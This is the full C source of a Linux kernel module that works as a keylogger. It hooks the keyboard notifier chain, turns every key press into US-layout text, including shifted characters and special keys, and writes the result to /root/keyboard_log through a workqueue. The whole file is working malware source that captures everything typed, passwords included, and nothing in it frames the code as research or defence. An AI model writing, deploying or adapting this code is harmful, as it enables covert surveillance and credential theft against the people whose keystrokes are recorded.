// SPDX-License-Identifier: GPL-2.0
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/workqueue.h>

#define LOG_FILE_PATH       "/root/keyboard_log"
#define MAX_BUFFER_SIZE     256
#define TMP_BUFF_SIZE       16

struct input_monitor {
    struct file *log_file;

    struct notifier_block keyboard_notifier;
    struct work_struct writer_task;

    char *keyboard_buffer;
    char *write_buffer;

    size_t buffer_offset;
    size_t buffer_len;
    loff_t file_off;

    char side_buffer[MAX_BUFFER_SIZE];
    char back_buffer[MAX_BUFFER_SIZE];
};

static int keyboard_callback(struct notifier_block *kblock, unsigned long action, void *data);
static void write_log_task(struct work_struct *work);
static size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_size);
static void flush_buffer(struct input_monitor *iomonitor);

static const char *us_keymap[][2] = {
    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
    {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
    {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
    {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
    {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
    {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
    {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
    {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
    {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
    {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
    {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
    {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
    {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
    {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
    {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
    {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
    {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
    {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
    {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
    {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
    {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
    {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
    {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
    {"_PAUSE_", "_PAUSE_"},                                         // 119
};

void flush_buffer(struct input_monitor *iomonitor)
{
    char *tmp = iomonitor->keyboard_buffer;
    iomonitor->keyboard_buffer = iomonitor->write_buffer;
    iomonitor->write_buffer = tmp;
    iomonitor->buffer_len = iomonitor->buffer_offset;
    schedule_work(&iomonitor->writer_task);
    memset(iomonitor->keyboard_buffer, 0x0, MAX_BUFFER_SIZE);
    iomonitor->buffer_offset = 0;
}


size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_size)
{
    memset(buffer, 0x0, buff_size);

    if(keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
    {
        const char *us_key = (shift == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
        snprintf(buffer, buff_size, "%s", us_key);
        return strlen(buffer);
    }

    return 0;
}

int keyboard_callback(struct notifier_block *kblock, unsigned long action, void *data)
{
    struct input_monitor *iomonitor;
    struct keyboard_notifier_param *key_param;
    size_t keystr_len = 0;
    char tmp_buff[TMP_BUFF_SIZE];

    if (action != KBD_KEYCODE)
        return NOTIFY_OK;

    iomonitor = container_of(kblock, struct input_monitor, keyboard_notifier);
    key_param = (struct keyboard_notifier_param *)data;

    if(!(key_param->down) || (keystr_len = keycode_to_us_string(key_param->value, key_param->shift, tmp_buff, TMP_BUFF_SIZE)) < 1)
        return NOTIFY_OK;

    if(tmp_buff[0] == '\n')
    {
        iomonitor->keyboard_buffer[iomonitor->buffer_offset++] = '\n';
        flush_buffer(iomonitor);
        return NOTIFY_OK;
    }

    if((iomonitor->buffer_offset + keystr_len) >= MAX_BUFFER_SIZE - 1)
        flush_buffer(iomonitor);

    strncpy(iomonitor->keyboard_buffer + iomonitor->buffer_offset, tmp_buff, keystr_len);
    iomonitor->buffer_offset += keystr_len;

    return NOTIFY_OK;
}

void write_log_task(struct work_struct *work)
{
    struct input_monitor *iomonitor;
    iomonitor = container_of(work, struct input_monitor, writer_task);
    kernel_write(iomonitor->log_file, iomonitor->write_buffer, iomonitor->buffer_len, &iomonitor->file_off);
}

static struct input_monitor *iomonitor;

static int __init k_key_logger_init(void)
{
    if((iomonitor = kzalloc(sizeof(struct input_monitor), GFP_KERNEL)) == NULL)
    {
        pr_err("Unable to alloc memory\n");
        return -ENOMEM;
    }

    iomonitor->keyboard_notifier.notifier_call = keyboard_callback;
    INIT_WORK(&iomonitor->writer_task, &write_log_task);

    if(IS_ERR(iomonitor->log_file = filp_open(LOG_FILE_PATH, O_CREAT | O_RDWR, 0644)))
    {
        pr_info("Unable to create a log file\n");
        kfree(iomonitor);
        return -EINVAL;
    }

    iomonitor->keyboard_buffer = iomonitor->side_buffer;
    iomonitor->write_buffer = iomonitor->back_buffer;

    register_keyboard_notifier(&iomonitor->keyboard_notifier);

    return 0;
}

static void __exit k_key_logger_exit(void)
{
   unregister_keyboard_notifier(&iomonitor->keyboard_notifier);
   cancel_work_sync(&iomonitor->writer_task);
   fput(iomonitor->log_file);
   kfree(iomonitor);
}

module_init(k_key_logger_init);
module_exit(k_key_logger_exit);
MODULE_LICENSE("GPL");
